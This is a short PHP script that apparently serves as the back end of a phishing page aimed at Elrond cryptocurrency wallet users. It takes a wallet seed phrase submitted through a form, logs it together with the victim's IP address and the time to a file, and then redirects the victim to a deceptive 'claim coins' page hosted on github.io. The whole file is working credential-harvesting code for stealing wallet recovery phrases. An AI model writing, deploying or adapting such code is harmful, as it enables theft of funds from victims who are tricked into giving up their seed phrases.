<?php
$file = "Elrond====bulan====APRIL";
$walletSeed   = $_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "================================seed====================================");
fwrite($handle, "\n");
fwrite($handle, "SEED : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP   : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://claimes-coins-youar-nows.github.io/fromes-tokens-elrondt/buaras1.html?access");

?>